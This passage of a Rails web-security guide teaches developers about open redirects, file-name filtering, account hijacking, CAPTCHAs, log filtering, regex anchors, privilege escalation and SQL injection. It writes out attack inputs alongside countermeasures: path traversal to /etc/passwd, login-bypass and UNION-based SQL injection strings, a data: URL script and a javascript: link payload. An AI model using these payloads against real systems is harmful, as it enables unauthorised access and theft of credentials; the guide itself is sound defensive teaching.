<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rescue_from</span> <span class="no">ActionController</span><span class="o">::</span><span class="no">InvalidAuthenticityToken</span> <span class="k">do</span> <span class="o">|</span><span class="n">exception</span><span class="o">|</span>
  <span class="n">sign_out_user</span> <span class="c1"># Example method that will destroy the user cookies</span>
<span class="k">end</span>
</code></pre></div></div>

<p>The above method can be placed in the <code class="language-plaintext highlighter-rouge">ApplicationController</code> and will be called when a CSRF token is not present or is incorrect on a non-GET request.</p>

<p>Note that <em>cross-site scripting (XSS) vulnerabilities bypass all CSRF protections</em>. XSS gives the attacker access to all elements on a page, so they can read the CSRF security token from a form or directly submit the form. Read <a href="#cross-site-scripting-xss">more about XSS</a> later.</p>

<h2 id="redirection-and-files">Redirection and Files</h2>

<p>Another class of security vulnerabilities surrounds the use of redirection and files in web applications.</p>

<h3 id="redirection">Redirection</h3>

<p>WARNING: <em>Redirection in a web application is an underestimated cracker tool: Not only can the attacker forward the user to a trap website, they may also create a self-contained attack.</em></p>

<p>Whenever the user is allowed to pass (parts of) the URL for redirection, it is possibly vulnerable. The most obvious attack would be to redirect users to a fake web application which looks and feels exactly as the original one. This so-called phishing attack works by sending an unsuspicious link in an email to the users, injecting the link by XSS in the web application or putting the link into an external site. It is unsuspicious, because the link starts with the URL to the web application and the URL to the malicious site is hidden in the redirection parameter: http://www.example.com/site/redirect?to=www.attacker.com. Here is an example of a legacy action:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">legacy</span>
  <span class="n">redirect_to</span><span class="p">(</span><span class="n">params</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="ss">action: </span><span class="s2">"main"</span><span class="p">))</span>
<span class="k">end</span>
</code></pre></div></div>

<p>This will redirect the user to the main action if they tried to access a legacy action. The intention was to preserve the URL parameters to the legacy action and pass them to the main action. However, it can be exploited by attacker if they included a host key in the URL:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.example.com/site/legacy?param1=xy&amp;param2=23&amp;host=www.attacker.com
</code></pre></div></div>

<p>If it is at the end of the URL it will hardly be noticed and redirects the user to the <code class="language-plaintext highlighter-rouge">attacker.com</code> host. As a general rule, passing user input directly into <code class="language-plaintext highlighter-rouge">redirect_to</code> is considered dangerous. A simple countermeasure would be to <em>include only the expected parameters in a legacy action</em> (again a permitted list approach, as opposed to removing unexpected parameters). <em>And if you redirect to a URL, check it with a permitted list or a regular expression</em>.</p>

<h4 id="self-contained-xss">Self-contained XSS</h4>

<p>Another redirection and self-contained XSS attack works in Firefox and Opera by the use of the data protocol. This protocol displays its contents directly in the browser and can be anything from HTML or JavaScript to entire images:</p>

<p><code class="language-plaintext highlighter-rouge">data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K</code></p>

<p>This example is a Base64 encoded JavaScript which displays a simple message box. In a redirection URL, an attacker could redirect to this URL with the malicious code in it. As a countermeasure, <em>do not allow the user to supply (parts of) the URL to be redirected to</em>.</p>

<h3 id="file-uploads">File Uploads</h3>

<p>NOTE: <em>Make sure file uploads don’t overwrite important files, and process media files asynchronously.</em></p>

<p>Many web applications allow users to upload files. <em>File names, which the user may choose (partly), should always be filtered</em> as an attacker could use a malicious file name to overwrite any file on the server. If you store file uploads at /var/www/uploads, and the user enters a file name like “../../../etc/passwd”, it may overwrite an important file. Of course, the Ruby interpreter would need the appropriate permissions to do so - one more reason to run web servers, database servers, and other programs as a less privileged Unix user.</p>

<p>When filtering user input file names, <em>don’t try to remove malicious parts</em>. Think of a situation where the web application removes all “../” in a file name and an attacker uses a string such as “….//” - the result will be “../”. It is best to use a permitted list approach, which <em>checks for the validity of a file name with a set of accepted characters</em>. This is opposed to a restricted list approach which attempts to remove not allowed characters. In case it isn’t a valid file name, reject it (or replace not accepted characters), but don’t remove them. Here is the file name sanitizer from the <a href="https://github.com/technoweenie/attachment_fu/tree/master">attachment_fu plugin</a>:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">sanitize_filename</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
  <span class="n">filename</span><span class="p">.</span><span class="nf">strip</span><span class="p">.</span><span class="nf">tap</span> <span class="k">do</span> <span class="o">|</span><span class="nb">name</span><span class="o">|</span>
    <span class="c1"># NOTE: File.basename doesn't work right with Windows paths on Unix</span>
    <span class="c1"># get only the filename, not the whole path</span>
    <span class="nb">name</span><span class="p">.</span><span class="nf">sub!</span><span class="p">(</span><span class="sr">/\A.*(\\|\/)/</span><span class="p">,</span> <span class="s2">""</span><span class="p">)</span>
    <span class="c1"># Finally, replace all non alphanumeric, underscore</span>
    <span class="c1"># or periods with underscore</span>
    <span class="nb">name</span><span class="p">.</span><span class="nf">gsub!</span><span class="p">(</span><span class="sr">/[^\w.-]/</span><span class="p">,</span> <span class="s2">"_"</span><span class="p">)</span>
  <span class="k">end</span>
<span class="k">end</span>
</code></pre></div></div>

<p>A significant disadvantage of synchronous processing of file uploads (as the <code class="language-plaintext highlighter-rouge">attachment_fu</code> plugin may do with images), is its <em>vulnerability to denial-of-service attacks</em>. An attacker can synchronously start image file uploads from many computers which increases the server load and may eventually crash or stall the server.</p>

<p>The solution to this is best to <em>process media files asynchronously</em>: Save the media file and schedule a processing request in the database. A second process will handle the processing of the file in the background.</p>

<h3 id="executable-code-in-file-uploads">Executable Code in File Uploads</h3>

<p>WARNING: <em>Source code in uploaded files may be executed when placed in specific directories. Do not place file uploads in Rails’ /public directory if it is Apache’s home directory.</em></p>

<p>The popular Apache web server has an option called DocumentRoot. This is the home directory of the website, everything in this directory tree will be served by the web server. If there are files with a certain file name extension, the code in it will be executed when requested (might require some options to be set). Examples for this are PHP and CGI files. Now think of a situation where an attacker uploads a file “file.cgi” with code in it, which will be executed when someone downloads the file.</p>

<p><em>If your Apache DocumentRoot points to Rails’ /public directory, do not put file uploads in it</em>, store files at least one level upwards.</p>

<h3 id="file-downloads">File Downloads</h3>

<p>NOTE: <em>Make sure users cannot download arbitrary files.</em></p>

<p>Just as you have to filter file names for uploads, you have to do so for downloads. The <code class="language-plaintext highlighter-rouge">send_file()</code> method sends files from the server to the client. If you use a file name, that the user entered, without filtering, any file can be downloaded:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">send_file</span><span class="p">(</span><span class="s2">"/var/www/uploads/"</span> <span class="o">+</span> <span class="n">params</span><span class="p">[</span><span class="ss">:filename</span><span class="p">])</span>
</code></pre></div></div>

<p>Simply pass a file name like “../../../etc/passwd” to download the server’s login information. A simple solution against this, is to <em>check that the requested file is in the expected directory</em>:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">basename</span> <span class="o">=</span> <span class="no">File</span><span class="p">.</span><span class="nf">expand_path</span><span class="p">(</span><span class="s2">"../../files"</span><span class="p">,</span> <span class="n">__dir__</span><span class="p">)</span>
<span class="n">filename</span> <span class="o">=</span> <span class="no">File</span><span class="p">.</span><span class="nf">expand_path</span><span class="p">(</span><span class="no">File</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">basename</span><span class="p">,</span> <span class="vi">@file</span><span class="p">.</span><span class="nf">public_filename</span><span class="p">))</span>
<span class="k">raise</span> <span class="k">if</span> <span class="n">basename</span> <span class="o">!=</span> <span class="no">File</span><span class="p">.</span><span class="nf">expand_path</span><span class="p">(</span><span class="no">File</span><span class="p">.</span><span class="nf">dirname</span><span class="p">(</span><span class="n">filename</span><span class="p">))</span>
<span class="n">send_file</span> <span class="n">filename</span><span class="p">,</span> <span class="ss">disposition: </span><span class="s2">"inline"</span>
</code></pre></div></div>

<p>Another (additional) approach is to store the file names in the database and name the files on the disk after the ids in the database. This is also a good approach to avoid possible code in an uploaded file to be executed. The <code class="language-plaintext highlighter-rouge">attachment_fu</code> plugin does this in a similar way.</p>

<h2 id="user-management">User Management</h2>

<h3 id="brute-forcing-accounts">Brute-Forcing Accounts</h3>

<p>NOTE: <em>Brute-force attacks on accounts are trial and error attacks on the login credentials. Fend them off with rate-limiting, more generic error messages and possibly require to enter a CAPTCHA.</em></p>

<p>A list of usernames for your web application may be misused to brute-force the corresponding passwords, because most people don’t use sophisticated passwords. Most passwords are a combination of dictionary words and possibly numbers. So armed with a list of usernames and a dictionary, an automatic program may find the correct password in a matter of minutes.</p>

<p>Because of this, most web applications will display a generic error message “username or password not correct”, if one of these are not correct. If it said “the username you entered has not been found”, an attacker could automatically compile a list of usernames.</p>

<p>However, what most web application designers neglect, are the forgot-password pages. These pages often admit that the entered username or e-mail address has (not) been found. This allows an attacker to compile a list of usernames and brute-force the accounts.</p>

<p>In order to mitigate such attacks, you can use rate limiting. Rails comes with a
built-in <a href="https://edgeapi.rubyonrails.org/classes/ActionController/RateLimiting/ClassMethods.html#method-i-rate_limit">rate-limiter</a>. You can enable it in your sessions controller with a single line:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class SessionsController &lt; ApplicationController
  rate_limit to: 10, within: 3.minutes, only: :create
end
</code></pre></div></div>

<p>Refer to the <a href="https://edgeapi.rubyonrails.org/classes/ActionController/RateLimiting/ClassMethods.html#method-i-rate_limit">API documentation</a> for details about the various parameters.</p>

<p>Additionally, you can <em>display a generic error message on forgot-password pages, too</em>. Moreover, you can <em>require to enter a CAPTCHA after a number of failed logins from a certain IP address</em>.</p>

<p>NOTE: All of these mitigation techniques are not a bullet-proof solution against automatic programs, because these programs may change their IP address exactly as often. However, it raises the barrier of an attack.</p>

<h3 id="account-hijacking">Account Hijacking</h3>

<p>Many web applications make it easy to hijack user accounts. Why not be different and make it more difficult?</p>

<h4 id="passwords">Passwords</h4>

<p>Think of a situation where an attacker has stolen a user’s session cookie and thus may co-use the application. If it is easy to change the password, the attacker will hijack the account with a few clicks. Or if the change-password form is vulnerable to CSRF, the attacker will be able to change the victim’s password by luring them to a web page where there is a crafted IMG-tag which does the CSRF. As a countermeasure, <em>make change-password forms safe against CSRF</em>, of course. And <em>require the user to enter the old password when changing it</em>.</p>

<h4 id="e-mail">E-Mail</h4>

<p>However, the attacker may also take over the account by changing the e-mail address. After they change it, they will go to the forgotten-password page and the (possibly new) password will be mailed to the attacker’s e-mail address. As a countermeasure <em>require the user to enter the password when changing the e-mail address, too</em>.</p>

<h4 id="other">Other</h4>

<p>Depending on your web application, there may be more ways to hijack the user’s account. In many cases CSRF and XSS will help to do so. For example, as in a CSRF vulnerability in <a href="https://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/">Google Mail</a>. In this proof-of-concept attack, the victim would have been lured to a website controlled by the attacker. On that site is a crafted IMG-tag which results in an HTTP GET request that changes the filter settings of Google Mail. If the victim was logged in to Google Mail, the attacker would change the filters to forward all e-mails to their e-mail address. This is nearly as harmful as hijacking the entire account. As a countermeasure, <em>review your application logic and eliminate all XSS and CSRF vulnerabilities</em>.</p>

<h3 id="captchas">CAPTCHAs</h3>

<p>INFO: <em>A CAPTCHA is a challenge-response test to determine that the response is not generated by a computer. It is often used to protect registration forms from attackers and comment forms from automatic spam bots by asking the user to type the letters of a distorted image. This is the positive CAPTCHA, but there is also the negative CAPTCHA. The idea of a negative CAPTCHA is not for a user to prove that they are human, but reveal that a robot is a robot.</em></p>

<p>A popular positive CAPTCHA API is <a href="https://developers.google.com/recaptcha/">reCAPTCHA</a> which displays two distorted images of words from old books. It also adds an angled line, rather than a distorted background and high levels of warping on the text as earlier CAPTCHAs did, because the latter were broken. As a bonus, using reCAPTCHA helps to digitize old books. <a href="https://github.com/ambethia/recaptcha/">ReCAPTCHA</a> is also a Rails plug-in with the same name as the API.</p>

<p>You will get two keys from the API, a public and a private key, which you have to put into your Rails environment. After that you can use the recaptcha_tags method in the view, and the verify_recaptcha method in the controller. Verify_recaptcha will return false if the validation fails.
The problem with CAPTCHAs is that they have a negative impact on the user experience. Additionally, some visually impaired users have found certain kinds of distorted CAPTCHAs difficult to read. Still, positive CAPTCHAs are one of the best methods to prevent all kinds of bots from submitting forms.</p>

<p>Most bots are really naive. They crawl the web and put their spam into every form’s field they can find. Negative CAPTCHAs take advantage of that and include a “honeypot” field in the form which will be hidden from the human user by CSS or JavaScript.</p>

<p>Note that negative CAPTCHAs are only effective against naive bots and won’t suffice to protect critical applications from targeted bots. Still, the negative and positive CAPTCHAs can be combined to increase the performance, e.g., if the “honeypot” field is not empty (bot detected), you won’t need to verify the positive CAPTCHA, which would require an HTTPS request to Google ReCaptcha before computing the response.</p>

<p>Here are some ideas how to hide honeypot fields by JavaScript and/or CSS:</p>

<ul>
  <li>position the fields off of the visible area of the page</li>
  <li>make the elements very small or color them the same as the background of the page</li>
  <li>leave the fields displayed, but tell humans to leave them blank</li>
</ul>

<p>The most simple negative CAPTCHA is one hidden honeypot field. On the server side, you will check the value of the field: If it contains any text, it must be a bot. Then, you can either ignore the post or return a positive result, but not saving the post to the database. This way the bot will be satisfied and moves on.</p>

<p>You can find more sophisticated negative CAPTCHAs in Ned Batchelder’s <a href="https://nedbatchelder.com/text/stopbots.html">blog post</a>:</p>

<ul>
  <li>Include a field with the current UTC time-stamp in it and check it on the server. If it is too far in the past, or if it is in the future, the form is invalid.</li>
  <li>Randomize the field names</li>
  <li>Include more than one honeypot field of all types, including submission buttons</li>
</ul>

<p>Note that this protects you only from automatic bots, targeted tailor-made bots cannot be stopped by this. So <em>negative CAPTCHAs might not be good to protect login forms</em>.</p>

<h3 id="logging">Logging</h3>

<p>WARNING: <em>Tell Rails not to put passwords in the log files.</em></p>

<p>By default, Rails logs all requests being made to the web application. But log files can be a huge security issue, as they may contain login credentials, credit card numbers et cetera. When designing a web application security concept, you should also think about what will happen if an attacker got (full) access to the web server. Encrypting secrets and passwords in the database will be quite useless, if the log files list them in clear text. You can <em>filter certain request parameters from your log files</em> by appending them to <a href="configuring.html#config-filter-parameters"><code class="language-plaintext highlighter-rouge">config.filter_parameters</code></a> in the application configuration. These parameters will be marked [FILTERED] in the log.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">config</span><span class="p">.</span><span class="nf">filter_parameters</span> <span class="o">&lt;&lt;</span> <span class="ss">:password</span>
</code></pre></div></div>

<p>NOTE: Provided parameters will be filtered out by partial matching regular
expression. Rails adds a list of default filters, including <code class="language-plaintext highlighter-rouge">:passw</code>,
<code class="language-plaintext highlighter-rouge">:secret</code>, and <code class="language-plaintext highlighter-rouge">:token</code>, in the appropriate initializer
(<code class="language-plaintext highlighter-rouge">initializers/filter_parameter_logging.rb</code>) to handle typical application
parameters like <code class="language-plaintext highlighter-rouge">password</code>, <code class="language-plaintext highlighter-rouge">password_confirmation</code> and <code class="language-plaintext highlighter-rouge">my_token</code>.</p>

<h3 id="regular-expressions">Regular Expressions</h3>

<p>INFO: <em>A common pitfall in Ruby’s regular expressions is to match the string’s beginning and end by ^ and $, instead of \A and \z.</em></p>

<p>Ruby uses a slightly different approach than many other languages to match the end and the beginning of a string. That is why even many Ruby and Rails books get this wrong. So how is this a security threat? Say you wanted to loosely validate a URL field and you used a simple regular expression like this:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/^https?:\/\/[^\n]+$/i</span>
</code></pre></div></div>

<p>This may work fine in some languages. However, <em>in Ruby <code class="language-plaintext highlighter-rouge">^</code> and <code class="language-plaintext highlighter-rouge">$</code> match the <strong>line</strong> beginning and line end</em>. And thus a URL like this passes the filter without problems:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>javascript:exploit_code();/*
http://hi.com
*/
</code></pre></div></div>

<p>This URL passes the filter because the regular expression matches - the second line, the rest does not matter. Now imagine we had a view that showed the URL like this:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">link_to</span> <span class="s2">"Homepage"</span><span class="p">,</span> <span class="vi">@user</span><span class="p">.</span><span class="nf">homepage</span>
</code></pre></div></div>

<p>The link looks innocent to visitors, but when it’s clicked, it will execute the JavaScript function “exploit_code” or any other JavaScript the attacker provides.</p>

<p>To fix the regular expression, <code class="language-plaintext highlighter-rouge">\A</code> and <code class="language-plaintext highlighter-rouge">\z</code> should be used instead of <code class="language-plaintext highlighter-rouge">^</code> and <code class="language-plaintext highlighter-rouge">$</code>, like so:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/\Ahttps?:\/\/[^\n]+\z/i</span>
</code></pre></div></div>

<p>Since this is a frequent mistake, the format validator (validates_format_of) now raises an exception if the provided regular expression starts with ^ or ends with $. If you do need to use ^ and $ instead of \A and \z (which is rare), you can set the :multiline option to true, like so:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># content should include a line "Meanwhile" anywhere in the string</span>
<span class="n">validates</span> <span class="ss">:content</span><span class="p">,</span> <span class="ss">format: </span><span class="p">{</span> <span class="ss">with: </span><span class="sr">/^Meanwhile$/</span><span class="p">,</span> <span class="ss">multiline: </span><span class="kp">true</span> <span class="p">}</span>
</code></pre></div></div>

<p>Note that this only protects you against the most common mistake when using the format validator - you always need to keep in mind that ^ and $ match the <strong>line</strong> beginning and line end in Ruby, and not the beginning and end of a string.</p>

<h3 id="privilege-escalation">Privilege Escalation</h3>

<p>WARNING: <em>Changing a single parameter may give the user unauthorized access. Remember that every parameter may be changed, no matter how much you hide or obfuscate it.</em></p>

<p>The most common parameter that a user might tamper with, is the id parameter, as in <code class="language-plaintext highlighter-rouge">http://www.domain.com/project/1</code>, whereas 1 is the id. It will be available in params in the controller. There, you will most likely do something like this:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="vi">@project</span> <span class="o">=</span> <span class="no">Project</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="ss">:id</span><span class="p">])</span>
</code></pre></div></div>

<p>This is alright for some web applications, but certainly not if the user is not authorized to view all projects. If the user changes the id to 42, and they are not allowed to see that information, they will have access to it anyway. Instead, <em>query the user’s access rights, too</em>:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="vi">@project</span> <span class="o">=</span> <span class="vi">@current_user</span><span class="p">.</span><span class="nf">projects</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="ss">:id</span><span class="p">])</span>
</code></pre></div></div>

<p>Depending on your web application, there will be many more parameters the user can tamper with. As a rule of thumb, <em>no user input data is secure, until proven otherwise, and every parameter from the user is potentially manipulated</em>.</p>

<p>Don’t be fooled by security by obfuscation and JavaScript security. Developer tools let you review and change every form’s hidden fields. <em>JavaScript can be used to validate user input data, but certainly not to prevent attackers from sending malicious requests with unexpected values</em>. DevTools log every request and may repeat and change them. That is an easy way to bypass any JavaScript validations. And there are even client-side proxies that allow you to intercept any request and response from and to the Internet.</p>

<h2 id="injection">Injection</h2>

<p>INFO: <em>Injection is a class of attacks that introduce malicious code or parameters into a web application in order to run it within its security context. Prominent examples of injection are cross-site scripting (XSS) and SQL injection.</em></p>

<p>Injection is very tricky, because the same code or parameter can be malicious in one context, but totally harmless in another. A context can be a scripting, query, or programming language, the shell, or a Ruby/Rails method. The following sections will cover all important contexts where injection attacks may happen. The first section, however, covers an architectural decision in connection with Injection.</p>

<h3 id="permitted-lists-versus-restricted-lists">Permitted Lists Versus Restricted Lists</h3>

<p>NOTE: <em>When sanitizing, protecting, or verifying something, prefer permitted lists over restricted lists.</em></p>

<p>A restricted list can be a list of bad e-mail addresses, non-public actions or bad HTML tags. This is opposed to a permitted list which lists the good e-mail addresses, public actions, good HTML tags, and so on. Although sometimes it is not possible to create a permitted list (in a SPAM filter, for example), <em>prefer to use permitted list approaches</em>:</p>

<ul>
  <li>Use <code class="language-plaintext highlighter-rouge">before_action except: [...]</code> instead of <code class="language-plaintext highlighter-rouge">only: [...]</code> for security-related actions. This way you don’t forget to enable security checks for newly added actions.</li>
  <li>Allow <code class="language-plaintext highlighter-rouge">&lt;strong&gt;</code> instead of removing <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> against Cross-Site Scripting (XSS). See below for details.</li>
  <li>Don’t try to correct user input using restricted lists:
    <ul>
      <li>This will make the attack work: <code class="language-plaintext highlighter-rouge">"&lt;sc&lt;script&gt;ript&gt;".gsub("&lt;script&gt;", "")</code></li>
      <li>But reject malformed input</li>
    </ul>
  </li>
</ul>

<p>Permitted lists are also a good approach against the human factor of forgetting something in the restricted list.</p>

<h3 id="sql-injection">SQL Injection</h3>

<p>INFO: <em>Thanks to clever methods, this is hardly a problem in most Rails applications. However, this is a very devastating and common attack in web applications, so it is important to understand the problem.</em></p>

<h4 id="introduction-1">Introduction</h4>

<p>SQL injection attacks aim at influencing database queries by manipulating web application parameters. A popular goal of SQL injection attacks is to bypass authorization. Another goal is to carry out data manipulation or reading arbitrary data. Here is an example of how not to use user input data in a query:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Project</span><span class="p">.</span><span class="nf">where</span><span class="p">(</span><span class="s2">"name = '</span><span class="si">#{</span><span class="n">params</span><span class="p">[</span><span class="ss">:name</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">)</span>
</code></pre></div></div>

<p>This could be in a search action and the user may enter a project’s name that they want to find. If a malicious user enters <code class="language-plaintext highlighter-rouge">' OR 1) --</code>, the resulting SQL query will be:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">projects</span> <span class="k">WHERE</span> <span class="p">(</span><span class="n">name</span> <span class="o">=</span> <span class="s1">''</span> <span class="k">OR</span> <span class="mi">1</span><span class="p">)</span> <span class="c1">--')</span>
</code></pre></div></div>

<p>The two dashes start a comment ignoring everything after it. So the query returns all records from the projects table including those blind to the user. This is because the condition is true for all records.</p>

<h4 id="bypassing-authorization">Bypassing Authorization</h4>

<p>Usually a web application includes access control. The user enters their login credentials and the web application tries to find the matching record in the users table. The application grants access when it finds a record. However, an attacker may possibly bypass this check with SQL injection. The following shows a typical database query in Rails to find the first record in the users table which matches the login credentials parameters supplied by the user.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">User</span><span class="p">.</span><span class="nf">find_by</span><span class="p">(</span><span class="s2">"login = '</span><span class="si">#{</span><span class="n">params</span><span class="p">[</span><span class="ss">:name</span><span class="p">]</span><span class="si">}</span><span class="s2">' AND password = '</span><span class="si">#{</span><span class="n">params</span><span class="p">[</span><span class="ss">:password</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">)</span>
</code></pre></div></div>

<p>If an attacker enters <code class="language-plaintext highlighter-rouge">' OR '1'='1</code> as the name, and <code class="language-plaintext highlighter-rouge">' OR '2'&gt;'1</code> as the password, the resulting SQL query will be:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">login</span> <span class="o">=</span> <span class="s1">''</span> <span class="k">OR</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1'</span> <span class="k">AND</span> <span class="n">password</span> <span class="o">=</span> <span class="s1">''</span> <span class="k">OR</span> <span class="s1">'2'</span><span class="o">&gt;</span><span class="s1">'1'</span> <span class="k">LIMIT</span> <span class="mi">1</span>
</code></pre></div></div>

<p>This will simply find the first record in the database, and grants access to this user.</p>

<h4 id="unauthorized-reading">Unauthorized Reading</h4>

<p>The UNION statement connects two SQL queries and returns the data in one set. An attacker can use it to read arbitrary data from the database. Let’s take the example from above:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Project</span><span class="p">.</span><span class="nf">where</span><span class="p">(</span><span class="s2">"name = '</span><span class="si">#{</span><span class="n">params</span><span class="p">[</span><span class="ss">:name</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">)</span>
</code></pre></div></div>

<p>And now let’s inject another query using the UNION statement:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
</code></pre></div></div>

<p>This will result in the following SQL query:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">projects</span> <span class="k">WHERE</span> <span class="p">(</span><span class="n">name</span> <span class="o">=</span> <span class="s1">''</span><span class="p">)</span> <span class="k">UNION</span>
  <span class="k">SELECT</span> <span class="n">id</span><span class="p">,</span><span class="n">login</span> <span class="k">AS</span> <span class="n">name</span><span class="p">,</span><span class="n">password</span> <span class="k">AS</span> <span class="n">description</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span> <span class="k">FROM</span> <span class="n">users</span> <span class="c1">--'</span>
</code></pre></div></div>

<p>The result won’t be a list of projects (because there is no project with an empty name), but a list of usernames and their password. So hopefully you <a href="#user-management">securely hashed the passwords</a> in the database! The only problem for the attacker is, that the number of columns has to be the same in both queries. That’s why the second query includes a list of ones (1), which will be always the value 1, in order to match the number of columns in the first query.</p>

<p>Also, the second query renames some columns with the AS statement so that the
Web application displays the values from the user table.</p>

<h4 id="countermeasures">Countermeasures</h4>

<p>Ruby on Rails has a built-in filter for special SQL characters, which will escape <code class="language-plaintext highlighter-rouge">'</code> , <code class="language-plaintext highlighter-rouge">"</code> , NULL character, and line breaks. <em>Using <code class="language-plaintext highlighter-rouge">Model.find(id)</code> or <code class="language-plaintext highlighter-rouge">Model.find_by_something(something)</code> automatically applies this countermeasure</em>. But in SQL fragments, especially <em>in conditions fragments (<code class="language-plaintext highlighter-rouge">where("...")</code>), the <code class="language-plaintext highlighter-rouge">connection.execute()</code> or <code class="language-plaintext highlighter-rouge">Model.find_by_sql()</code> methods, it has to be applied manually</em>.</p>

<p>Instead of passing a string, you can use positional handlers to sanitize tainted strings like this:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Model</span><span class="p">.</span><span class="nf">where</span><span class="p">(</span><span class="s2">"zip_code = ? AND quantity &gt;= ?"</span><span class="p">,</span> <span class="n">entered_zip_code</span><span class="p">,</span> <span class="n">entered_quantity</span><span class="p">).</span><span class="nf">first</span>
</code></pre></div></div>

<p>The first parameter is an SQL fragment with question marks. The second and third
parameter will replace the question marks with the value of the variables.</p>

<p>You can also use named handlers, the values will be taken from the hash used:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">values</span> <span class="o">=</span> <span class="p">{</span> <span class="ss">zip: </span><span class="n">entered_zip_code</span><span class="p">,</span> <span class="ss">qty: </span><span class="n">entered_quantity</span> <span class="p">}</span>
<span class="no">Model</span><span class="p">.</span><span class="nf">where</span><span class="p">(</span><span class="s2">"zip_code = :zip AND quantity &gt;= :qty"</span><span class="p">,</span> <span class="n">values</span><span class="p">).</span><span class="nf">first</span>
</code></pre></div></div>

<p>Additionally, you can split and chain conditionals valid for your use case:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Model</span><span class="p">.</span><span class="nf">where</span><span class="p">(</span><span class="ss">zip_code: </span><span class="n">entered_zip_code</span><span class="p">).</span><span class="nf">where</span><span class="p">(</span><span class="s2">"quantity &gt;= ?"</span><span class="p">,</span> <span class="n">entered_quantity</span><span class="p">).</span><span class="nf">first</span>
</code></pre></div></div>

<p>Note the previous mentioned countermeasures are only available in model instances. You can
try <a href="https://api.rubyonrails.org/classes/ActiveRecord/Sanitization/ClassMethods.html#method-i-sanitize_sql"><code class="language-plaintext highlighter-rouge">sanitize_sql</code></a> elsewhere. <em>Make it a habit to think about the security consequences
when using an external string in SQL</em>.</p>

<h3 id="cross-site-scripting-xss">Cross-Site Scripting (XSS)</h3>

<p>INFO: <em>The most widespread, and one of the most devastating security vulnerabilities in web applications is XSS. This malicious attack injects client-side executable code. Rails provides helper methods to fend these attacks off.</em></p>

<h4 id="entry-points">Entry Points</h4>

<p>An entry point is a vulnerable URL and its parameters where an attacker can start an attack.</p>

<p>The most common entry points are message posts, user comments, and guest books, but project titles, document names, and search result pages have also been vulnerable - just about everywhere where the user can input data. But the input does not necessarily have to come from input boxes on websites, it can be in any URL parameter - obvious, hidden or internal. Remember that the user may intercept any traffic. Applications or client-site proxies make it easy to change requests. There are also other attack vectors like banner advertisements.</p>

<p>XSS attacks work like this: An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim. Most XSS examples simply display an alert box, but it is more powerful than that. XSS can steal the cookie, hijack the session, redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the website to get confidential information or install malicious software through security holes in the web browser.</p>

<p>During the second half of 2007, there were 88 vulnerabilities reported in Mozilla browsers, 22 in Safari, 18 in IE, and 12 in Opera. The Symantec Global Internet Security threat report also documented 239 browser plug-in vulnerabilities in the last six months of 2007. <a href="https://www.pandasecurity.com/en/mediacenter/malware/mpack-uncovered/">Mpack</a> is a very active and up-to-date attack framework which exploits these vulnerabilities. For criminal hackers, it is very attractive to exploit an SQL-Injection vulnerability in a web application framework and insert malicious code in every textual table column. In April 2008 more than 510,000 sites were hacked like this, among them the British government, United Nations, and many more high profile targets.</p>

<h4 id="htmljavascript-injection">HTML/JavaScript Injection</h4>

